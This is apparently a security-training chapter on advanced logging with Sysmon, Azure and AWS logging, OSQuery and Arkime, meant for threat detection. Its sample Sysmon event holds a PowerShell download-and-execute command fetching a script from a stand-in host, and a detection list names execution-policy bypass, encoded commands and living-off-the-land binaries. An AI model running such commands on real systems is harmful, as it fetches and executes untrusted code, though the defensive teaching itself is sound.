# 5.6: Advanced Logging Technologies

Beyond traditional syslog and Windows Event Logging, modern security environments require advanced logging capabilities to address cloud services, endpoint visibility, and network traffic analysis. This chapter explores specialized logging technologies including enhanced Windows monitoring, cloud platform logging, endpoint instrumentation, and network traffic capture systems.

---

## Enhanced Windows Monitoring with Sysmon

### Sysmon Architecture and Deployment

#### System Monitor Overview

**Sysmon** (System Monitor) is a Windows system service and device driver that provides granular visibility into system activity through the Windows Event Log. Unlike standard Windows logging, Sysmon captures detailed information about process creation, network connections, and file operations that are crucial for security monitoring.

**Core Capabilities**:
- **Process creation logging** with complete command lines and parent process relationships
- **Network connection monitoring** with process attribution and connection details
- **File creation time change detection** identifying timestamp manipulation attempts
- **Process and thread access** monitoring for injection and hollowing detection
- **Image/DLL load events** for code injection and malware analysis
- **Registry access monitoring** for persistence mechanism detection
- **WMI activity logging** for lateral movement and persistence detection

#### Installation and Configuration Management

**Basic Installation Process**:
```cmd
# Download from Microsoft Sysinternals
# https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

# Install with default configuration
sysmon -accepteula -i

# Install with custom configuration file
sysmon -accepteula -i sysmonconfig.xml

# Update existing configuration
sysmon -c sysmonconfig.xml

# Uninstall Sysmon
sysmon -u
```

**Enterprise Deployment Strategies**:
- **Group Policy deployment**: Centralized installation across domain-joined systems
- **SCCM/WSUS integration**: Software distribution through existing management infrastructure
- **PowerShell DSC**: Desired State Configuration for automated deployment and maintenance
- **Container integration**: Sysmon deployment in containerized Windows environments

### Critical Sysmon Event Types

#### Event ID 1 - Process Creation

**Enhanced Process Monitoring**:
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <s>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2023-10-15T09:30:45.123456Z"/>
    <Computer>WORKSTATION01.corp.com</Computer>
  </s>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2023-10-15 09:30:45.123</Data>
    <Data Name="ProcessGuid">{12345678-1234-1234-1234-123456789012}</Data>
    <Data Name="ProcessId">1234</Data>
    <Data Name="Image">C:\Windows\System32\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"</Data>
    <Data Name="CurrentDirectory">C:\Users\admin\</Data>
    <Data Name="User">CORP\admin</Data>
    <Data Name="LogonGuid">{12345678-1234-1234-1234-123456789012}</Data>
    <Data Name="LogonId">0x25a04e</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">High</Data>
    <Data Name="Hashes">MD5=5B6CE5B3025C74F7F8F73B0C8C4A3E1F,SHA256=7A8E7B92F3C...</Data>
    <Data Name="ParentProcessGuid">{12345678-1234-1234-1234-123456789012}</Data>
    <Data Name="ParentProcessId">2345</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">cmd.exe /c malicious.bat</Data>
    <Data Name="ParentUser">CORP\admin</Data>
  </EventData>
</Event>
```

**Key Fields for Security Analysis**:
- **CommandLine**: Complete command execution including parameters and arguments
- **ParentImage/ParentCommandLine**: Process ancestry for attack chain reconstruction
- **Hashes**: File integrity verification and malware identification
- **IntegrityLevel**: Process privilege level and UAC context
- **LogonGuid**: Session correlation across multiple events

**Suspicious Pattern Detection**:
```
Attack Pattern Examples:
├── PowerShell execution policy bypass: -ExecutionPolicy Bypass
├── Base64 encoded commands: -EncodedCommand [base64_string]
├── Download and execute: IEX (New-Object Net.WebClient).DownloadString
├── Living-off-the-land binaries: certutil, bitsadmin, regsvr32
└── Process injection indicators: rundll32, regsvr32 with unusual parameters
```

#### Event ID 3 - Network Connection

**Network Activity Attribution**:
```xml
<EventData>
  <Data Name="RuleName">-</Data>
  <Data Name="UtcTime">2023-10-15 09:31:12.456</Data>
  <Data Name="ProcessGuid">{12345678-1234-1234-1234-123456789012}</Data>
  <Data Name="ProcessId">1234</Data>
  <Data Name="Image">C:\Windows\System32\powershell.exe</Data>
  <Data Name="User">CORP\admin</Data>
  <Data Name="Protocol">tcp</Data>
  <Data Name="Initiated">true</Data>
  <Data Name="SourceIsIpv6">false</Data>
  <Data Name="SourceIp">192.168.1.100</Data>
  <Data Name="SourceHostname">WORKSTATION01.corp.com</Data>
  <Data Name="SourcePort">52341</Data>
  <Data Name="SourcePortName">-</Data>
  <Data Name="DestinationIsIpv6">false</Data>
  <Data Name="DestinationIp">185.199.108.153</Data>
  <Data Name="DestinationHostname">raw.githubusercontent.com</Data>
  <Data Name="DestinationPort">443</Data>
  <Data Name="DestinationPortName">https</Data>
</EventData>
```

**Network Analysis Capabilities**:
- **Process attribution**: Direct correlation between network activity and responsible processes
- **Command and control detection**: Identification of C2 communication patterns
- **Data exfiltration monitoring**: Large or unusual data transfers from specific processes
- **Lateral movement tracking**: Network connections between internal systems

#### Event ID 7 - Image/DLL Loaded

**Code Injection and Malware Detection**:
- **DLL injection identification**: Unusual library loading into legitimate processes
- **Process hollowing detection**: Image replacement within running processes
- **Reflective DLL loading**: In-memory library loading without file system artifacts
- **Digital signature validation**: Verification of loaded code authenticity

#### Event ID 11 - File Created

**File System Monitoring**:
- **Malware dropper activity**: New executable file creation in suspicious locations
- **Persistence mechanism detection**: File creation in startup folders and registry locations
- **Data staging identification**: Large file creation indicating potential exfiltration preparation
- **Temporary file analysis**: Analysis of files created in temporary directories

### Sysmon Configuration Best Practices

#### Community-Maintained Configurations

**SwiftOnSecurity Configuration**:
```xml
<!-- High-quality, community-maintained baseline -->
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Process creation monitoring with intelligent exclusions -->
    <ProcessCreate onmatch="exclude">
      <!-- Exclude noisy but benign system processes -->
      <Image condition="is">C:\Windows\System32\conhost.exe</Image>
      <Image condition="is">C:\Windows\System32\wermgr.exe</Image>
      <Image condition="is">C:\Windows\System32\wuauclt.exe</Image>
      
      <!-- Exclude common applications generating high volume -->
      <ParentImage condition="is">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</ParentImage>
      <ParentImage condition="is">C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</ParentImage>
    </ProcessCreate>
    
    <!-- Network connection monitoring -->
    <NetworkConnect onmatch="exclude">
      <!-- Exclude known-good applications -->
      <Image condition="is">C:\Program Files\Windows Defender\MsMpEng.exe</Image>
      <Image condition="is">C:\Windows\System32\svchost.exe</Image>
      
      <!-- Exclude common destination ports -->
      <DestinationPort condition="is">443</DestinationPort>
      <DestinationPort condition="is">80</DestinationPort>
    </NetworkConnect>
    
    <!-- File creation monitoring with focused scope -->
    <FileCreate onmatch="include">
      <!-- Monitor suspicious file locations -->
      <TargetFilename condition="contains">\Startup\</TargetFilename>
      <TargetFilename condition="contains">\Start Menu\</TargetFilename>
      <TargetFilename condition="contains">\AppData\Roaming\Microsoft\Windows\Start Menu\</TargetFilename>
      <TargetFilename condition="contains">C:\Users\Public\</TargetFilename>
      <TargetFilename condition="contains">C:\Perflogs\</TargetFilename>
      
      <!-- Monitor script file creation -->
      <TargetFilename condition="endswith">.ps1</TargetFilename>
      <TargetFilename condition="endswith">.bat</TargetFilename>
      <TargetFilename condition="endswith">.vbs</TargetFilename>
      <TargetFilename condition="endswith">.js</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

#### Performance Optimization Strategies

**Event Volume Management**:
- **Exclude approach**: Start with comprehensive monitoring and exclude known-good activities
- **Process exclusions**: Remove high-volume, low-value system processes
- **Time-based filtering**: Different monitoring levels for business hours vs. off-hours
- **Network filtering**: Focus on suspicious protocols and external destinations

**Configuration Maintenance**:
- **Regular updates**: Keep configuration current with emerging attack techniques
- **Environment tuning**: Customize for organizational applications and business processes
- **Performance monitoring**: Track event volume and system impact
- **Testing procedures**: Validate configuration changes in non-production environments

---

## Cloud Platform Logging

### Microsoft Azure Logging and Monitoring

#### Azure Monitor Architecture

**Comprehensive Monitoring Platform**:
- **Log Analytics Workspaces**: Centralized log storage and analysis platform
- **Azure Activity Log**: Subscription-level administrative and operational events
- **Azure AD Logs**: Authentication, authorization, and identity management events
- **Resource Logs**: Service-specific operational and diagnostic information

**Data Sources and Integration**:
```
Azure Monitor Data Sources:
├── Azure Services (Built-in integration)
│   ├── Virtual Machines (Performance, security events)
│   ├── Azure Active Directory (Sign-ins, audit logs)
│   ├── Key Vault (Access and usage logs)
│   ├── Network Security Groups (Flow logs)
│   └── Storage Accounts (Access and transaction logs)
├── Custom Applications (Application Insights)
├── On-premises Systems (Log Analytics Agent)
└── Third-party Services (REST API integration)
```

#### Kusto Query Language (KQL) for Security Analysis

**Authentication Analysis Example**:
```kusto
// Failed sign-in analysis
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType != 0
| summarize FailureCount = count() by UserPrincipalName, AppDisplayName, bin(TimeGenerated, 1h)
| where FailureCount > 10
| sort by FailureCount desc

// Impossible travel detection
SigninLogs
| where TimeGenerated > ago(7d)
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, Location, IPAddress
| summarize Locations = make_set(Location) by UserPrincipalName
| where array_length(Locations) > 1
```

**Security Event Correlation**:
```kusto
// Correlate Azure AD sign-ins with VM activities
let suspiciousSignins = SigninLogs
| where TimeGenerated > ago(1h)
| where RiskLevelDuringSignIn == "high"
| project TimeGenerated, UserPrincipalName, IPAddress;

SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4624
| join kind=inner suspiciousSignins on $left.Account == $right.UserPrincipalName
| project TimeGenerated, Account, Computer, IPAddress, Activity
```

#### Azure Sentinel Integration

**Native SIEM Capabilities**:
- **Built-in connectors**: Seamless integration with Azure services and third-party tools
- **Analytics rules**: KQL-based detection rules for automated threat detection
- **Workbooks**: Interactive dashboards for security operations and investigation
- **Playbooks**: Logic Apps integration for automated response and remediation

### Amazon Web Services (AWS) Logging

#### AWS CloudTrail and CloudWatch

**CloudTrail API Logging**:
```json
{
  "eventVersion": "1.05",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDACKCEVSQ6C2EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/admin",
    "accountId": "123456789012",
    "userName": "admin"
  },
  "eventTime": "2023-10-15T09:30:45Z",
  "eventSource": "ec2.amazonaws.com",
  "eventName": "RunInstances",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "192.168.1.100",
  "userAgent": "aws-cli/2.0.0 Python/3.8.0",
  "requestParameters": {
    "instancesSet": {
      "items": [
        {
          "imageId": "ami-12345678",
          "minCount": 1,
          "maxCount": 1,
          "instanceType": "t3.micro"
        }
      ]
    }
  },
  "responseElements": {
    "instancesSet": {
      "items": [
        {
          "instanceId": "i-0abcdef1234567890",
          "imageId": "ami-12345678",
          "state": {
            "code": 0,
            "name": "pending"
          }
        }
      ]
    }
  }
}
```

**Security Monitoring Use Cases**:
- **Privilege escalation**: IAM policy changes and role assumption activities
- **Resource manipulation**: EC2 instance creation, security group modifications
- **Data access**: S3 bucket access patterns and permission changes
- **Configuration changes**: Infrastructure modifications and security control bypass

#### AWS Security Services Integration

**GuardDuty Integration**:
- **Threat detection**: Machine learning-based anomaly detection
- **IOC matching**: Known malicious IP and domain correlation
- **Behavioral analysis**: Unusual API call patterns and resource usage
- **Threat intelligence**: Integration with AWS and third-party threat feeds

**AWS Config Integration**:
- **Compliance monitoring**: Configuration drift detection and policy enforcement
- **Change tracking**: Historical configuration changes with attribution
- **Remediation automation**: Automatic correction of policy violations
- **Assessment reporting**: Compliance posture visualization and reporting

---

## Endpoint Visibility with OSQuery

### OSQuery Framework Architecture

#### Universal Endpoint Agent

**Cross-Platform Capabilities**:
- **Operating System Support**: Windows, macOS, Linux with unified query language
- **SQL Interface**: Familiar query syntax for system information extraction
- **Real-time Monitoring**: Continuous monitoring with scheduled query execution
- **Event-Based Collection**: File system, process, and network change detection

**OSQuery Table Schema**:
```sql
-- Process information
SELECT pid, name, path, cmdline, parent, uid, gid 
FROM processes 
WHERE name LIKE '%powershell%';

-- Network connections
SELECT pid, family, protocol, local_address, local_port, remote_address, remote_port 
FROM process_open_sockets 
WHERE remote_port = 443;

-- File system monitoring
SELECT target_path, category, time, action 
FROM file_events 
WHERE target_path LIKE '/etc/%' AND action = 'CREATED';

-- User account information
SELECT uid, gid, username, description, directory, shell 
FROM users 
WHERE shell NOT LIKE '%nologin%';
```

#### Deployment and Management

**Fleet Management Solutions**:
- **Kolide Fleet**: Open-source osquery fleet manager with web interface
- **Facebook osquery Manager**: Centralized configuration and query management
- **Commercial Solutions**: Enterprise-grade management with additional security features
- **Custom Infrastructure**: API-based integration with existing management platforms

**Configuration Management**:
```json
{
  "options": {
    "config_plugin": "tls",
    "logger_plugin": "tls",
    "enroll_tls_endpoint": "/api/v1/osquery/enroll",
    "config_tls_endpoint": "/api/v1/osquery/config",
    "logger_tls_endpoint": "/api/v1/osquery/log",
    "disable_distributed": false,
    "distributed_plugin": "tls",
    "distributed_interval": 60,
    "distributed_tls_max_attempts": 3
  },
  "schedule": {
    "process_events": {
      "query": "SELECT pid, path, cmdline FROM processes WHERE pid != last_pid;",
      "interval": 60,
      "removed": false
    },
    "network_connections": {
      "query": "SELECT pid, family, protocol, local_address, remote_address FROM process_open_sockets;",
      "interval": 300,
      "removed": false
    }
  }
}
```

### Security-Focused OSQuery Implementations

#### Threat Hunting Queries

**Persistence Mechanism Detection**:
```sql
-- Startup programs monitoring
SELECT name, path, source FROM startup_items;

-- Scheduled tasks analysis
SELECT name, action, path, enabled FROM scheduled_tasks 
WHERE enabled = 1 AND path NOT LIKE 'C:\Windows\%';

-- Browser extension monitoring
SELECT name, identifier, version, path FROM browser_plugins 
WHERE browser_type = 'chrome';

-- Service analysis
SELECT name, service_type, status, path, start_type 
FROM services 
WHERE start_type = 'AUTO_START' AND path NOT LIKE 'C:\Windows\%';
```

**Lateral Movement Detection**:
```sql
-- Remote desktop sessions
SELECT user, host, time FROM logged_in_users 
WHERE type = 'user' AND host != 'localhost';

-- Network shares enumeration
SELECT device, path, type FROM mounts 
WHERE type = 'cifs' OR type = 'nfs';

-- Process network activity correlation
SELECT p.pid, p.name, p.path, p.cmdline, pos.remote_address, pos.remote_port
FROM processes p
JOIN process_open_sockets pos ON p.pid = pos.pid
WHERE pos.remote_address NOT LIKE '192.168.%' AND pos.remote_address NOT LIKE '10.%';
```

#### Compliance and Configuration Monitoring

**Security Configuration Assessment**:
```sql
-- Password policy verification (Windows)
SELECT * FROM password_policy;

-- Firewall status monitoring
SELECT service, display_name, status FROM services 
WHERE service = 'MpsSvc' OR service = 'SharedAccess';

-- Security software verification
SELECT name, version, install_date FROM programs 
WHERE name LIKE '%antivirus%' OR name LIKE '%defender%';

-- User privilege analysis
SELECT u.username, g.groupname 
FROM users u 
JOIN user_groups ug ON u.uid = ug.uid 
JOIN groups g ON ug.gid = g.gid 
WHERE g.groupname IN ('Administrators', 'Domain Admins', 'Enterprise Admins');
```

---

## Network Traffic Analysis with Arkime

### Full Packet Capture and Indexing

#### Arkime Architecture Overview

**Arkime** (formerly Moloch) provides comprehensive network traffic capture, indexing, and analysis capabilities designed for security operations and forensic investigation.

**Core Components**:
- **Capture Nodes**: Distributed sensors for packet capture and initial processing
- **Elasticsearch Backend**: Scalable storage and indexing for packet metadata
- **Viewer Interface**: Web-based interface for search, analysis, and investigation
- **Parliament**: Cluster monitoring and management interface

**Deployment Architecture**:
```
Network Traffic → Capture Nodes → Elasticsearch Cluster → Viewer Interface
                       ↓                    ↓                   ↓
                  Packet Storage    Metadata Indexing    Analyst Access
```

#### Packet Capture and Processing

**Capture Capabilities**:
- **High-speed capture**: Multi-gigabit packet capture with minimal packet loss
- **Protocol parsing**: Deep packet inspection and protocol-specific analysis
- **Metadata extraction**: Key field extraction for efficient searching and analysis
- **PCAP storage**: Full packet preservation for detailed forensic analysis

**Metadata Indexing**:
```json
{
  "@timestamp": "2023-10-15T09:30:45.123Z",
  "srcIp": "192.168.1.100",
  "dstIp": "185.199.108.153",
  "srcPort": 52341,
  "dstPort": 443,
  "protocol": "tcp",
  "packets": {
    "src": 45,
    "dst": 32
  },
  "bytes": {
    "src": 2048,
    "dst": 15360
  },
  "firstPacket": "2023-10-15T09:30:45.123Z",
  "lastPacket": "2023-10-15T09:30:47.890Z",
  "node": "sensor01",
  "fileNum": 230145,
  "http": {
    "uri": "/malicious/payload.exe",
    "host": "malicious.domain.com",
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "statuscode": 200,
    "method": "GET"
  },
  "tls": {
    "version": "1.2",
    "cipher": "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "ja3": "769,47-53-5-10-49161-49162-49171-49172...",
    "ja3s": "769,47,65281"
  }
}
```

### Security Analysis and Investigation

#### Threat Detection Capabilities

**Malware Communication Detection**:
- **C2 identification**: Command and control channel detection through traffic patterns
- **Beaconing detection**: Periodic communication pattern analysis
- **Data exfiltration**: Large or unusual data transfer identification
- **Protocol anomalies**: Non-standard protocol usage and encapsulation

**Network-Based IOC Matching**:
- **IP reputation**: Known malicious IP address identification
- **Domain analysis**: Suspicious domain communication and DGA detection
- **SSL/TLS analysis**: Certificate validation and encrypted channel inspection
- **File hash correlation**: Transferred file identification through hashing

#### Investigation Workflow

**Incident Response Integration**:
```
Incident Alert → Arkime Search → PCAP Retrieval → Analysis → Evidence Collection
```

**Search and Analysis Features**:
- **Time-based searches**: Precise temporal filtering for incident investigation
- **Protocol-specific queries**: HTTP, DNS, TLS, and custom protocol analysis
- **Statistical analysis**: Traffic volume, pattern, and anomaly identification
- **Correlation capabilities**: Cross-session and multi-protocol analysis

**PCAP Export and Integration**:
- **Wireshark integration**: Seamless PCAP export for detailed protocol analysis
- **Forensic preservation**: Evidence-quality packet capture with chain of custody
- **API access**: Programmatic access for automated analysis and integration
- **Third-party tool integration**: Connection with other security analysis platforms

---

## Integration Strategies and Best Practices

### Multi-Source Log Correlation

#### Unified Analysis Platform

**Cross-Platform Correlation**:
- **Endpoint-Network correlation**: Sysmon process events with Arkime network traffic
- **Cloud-On premises**: Azure AD authentication with on-premises Windows events
- **Application-Infrastructure**: OSQuery system state with application performance logs
- **Time synchronization**: NTP-based timestamp alignment across all sources

#### Enrichment and Context Addition

**Contextual Enhancement Pipeline**:
```
Raw Log Event → Geolocation → Asset Context → Threat Intelligence → Risk Scoring → SIEM Ingestion
```

**Enhancement Sources**:
- **Asset management**: Device ownership, criticality, and configuration information
- **Identity systems**: User role, department, and access privilege information
- **Threat intelligence**: IOC matching, threat actor attribution, and campaign correlation
- **Vulnerability data**: System weakness correlation with detected activities

### Performance and Scalability Considerations

#### Data Volume Management

**Tiered Collection Strategy**:
- **High-value, low-volume**: Detailed logging for critical systems and security events
- **Medium-value, medium-volume**: Standard logging for business systems and applications
- **Low-value, high-volume**: Sampled or filtered logging for routine operational activities

**Storage and Retention Optimization**:
- **Hot storage**: Real-time analysis data with high-performance access requirements
- **Warm storage**: Historical data for investigation and trend analysis
- **Cold storage**: Long-term retention for compliance and forensic preservation

#### Integration Architecture

**Centralized vs. Distributed Processing**:
- **Edge processing**: Local filtering and initial analysis at remote locations
- **Regional aggregation**: Intermediate processing and correlation before central analysis
- **Central correlation**: Comprehensive analysis and cross-source correlation
- **Cloud integration**: Hybrid architectures leveraging cloud scalability and on-premises control

[⬆️ Back to SIEM & Monitoring](./README.md)
